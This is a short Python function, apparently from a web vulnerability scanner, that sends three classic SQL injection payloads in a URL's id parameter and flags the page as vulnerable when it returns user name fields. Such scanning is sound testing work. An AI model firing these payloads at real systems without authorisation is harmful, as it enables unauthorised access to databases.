def test_sqli(requester, url):
    payloads = [
        "' OR '1'='1",
        "' OR 1=1 -- ",
        "\" OR \"1\"=\"1"
    ]

    vulnerabilities = []

    for payload in payloads:
        test_url = url + "?id=" + payload + "&Submit=Submit"

        try:
            print("Testing:", test_url)

            response = requester.session.get(test_url, timeout=5)

            if "First name" in response.text and "Surname" in response.text:
                vulnerabilities.append({
                    "url": test_url,
                    "type": "SQL Injection",
                    "severity": "High"
                })
                break

        except:
            pass

    return vulnerabilities
